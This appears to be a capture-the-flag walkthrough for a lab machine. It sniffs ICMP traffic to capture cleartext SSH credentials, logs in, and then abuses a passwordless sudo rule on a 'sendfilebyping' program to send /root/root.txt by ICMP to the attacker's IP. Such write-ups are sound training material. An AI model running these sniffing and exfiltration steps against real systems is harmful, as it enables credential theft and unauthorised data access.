Navigating to port 80/HTTP we have the below page, which automatically pings the IP making the request to this site

Viewing page-source we have some few commented texts.

To me this looks like an hint telling us to listen for ICMP echo requests, It is good practice not just to listen but to use the `-A` option to display all data as described [here](https://stackoverflow.com/questions/38342290/how-to-display-all-data-using-tcpdump)


```bash
❯ sudo tcpdump -i wlan0 icmp -A
[sudo] password for sec-fortress: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on wlan0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Then navigate to the website and refresh the page in which going back to our command lie you should see clear text credentials

We have the following credential ; `pinger:P!ngM3`, we can go ahead and try to use this to login via the SSH protocol, which works!!


```bash
❯ ssh pinger@192.168.0.151

Navigating to the `/var/www/html` directory and examining the `index.php` we can see how our user foothold was possible as described in the image below.

Checking for executables our current user can run with the `sudo` command we have the below output


```bash
pinger@pingme:/var/www/html$ sudo -l
Matching Defaults entries for pinger on pingme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pinger may run the following commands on pingme:
    (root) NOPASSWD: /usr/local/sbin/sendfilebyping
pinger@pingme:/var/www/html$ 
```


It is possible to read the root flag as this program sends data over the ICMP protocol and it is most likely wouldn't be comfortable getting a reverse shell.


- Start up `tcpdump` listening on the ICMP protocol

```bash
❯ sudo tcpdump -i wlan0 icmp -A
```

- Then execute this command to get the root flag


```bash
pinger@pingme:/var/www/html$ sudo /usr/local/sbin/sendfilebyping 192.168.0.158 /root/root.txt
```

> **Note :** The root flag is  in sequence so, H - move to the next line, M - move to the next line, V - move to the next line.....Just like this.
